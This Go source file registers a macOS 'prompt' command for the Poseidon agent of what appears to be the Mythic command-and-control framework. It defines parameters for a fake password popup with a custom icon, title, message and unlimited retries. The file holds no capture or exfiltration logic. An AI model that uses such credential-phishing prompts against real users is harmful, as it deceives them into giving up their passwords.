package agentfunctions

import (
	"errors"
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("poseidon").AddCommand(agentstructs.Command{
		Name:                "prompt",
		Description:         "Prompt the user for their password by specifying a custom icon, title, and message text",
		HelpString:          "prompt",
		Version:             1,
		Author:              "@xorrior",
		MitreAttackMappings: []string{},
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "icon",
				ModalDisplayName: "Icon Path",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
					},
				},
				Description: "Path to the .icns file to use as an icon in the popup",
			},
			{
				Name:             "title",
				ModalDisplayName: "Title Text",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
					},
				},
				Description: "Title text to display in bold in the popup",
			},
			{
				Name:             "message",
				ModalDisplayName: "Message Text",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
					},
				},
				Description: "Informative message text to display below the title for the popup",
			},
			{
				Name:             "max_tries",
				ModalDisplayName: "Max ReTries",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     -1,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
					},
				},
				Description: "Maximum number of times to re-prompt the user for their password before giving up. -1 is never give up.",
			},
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			return response
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if len(input) > 0 {
				return args.LoadArgsFromJSONString(input)
			} else {
				return errors.New("Must supply arguments")
			}
		},
	})
}
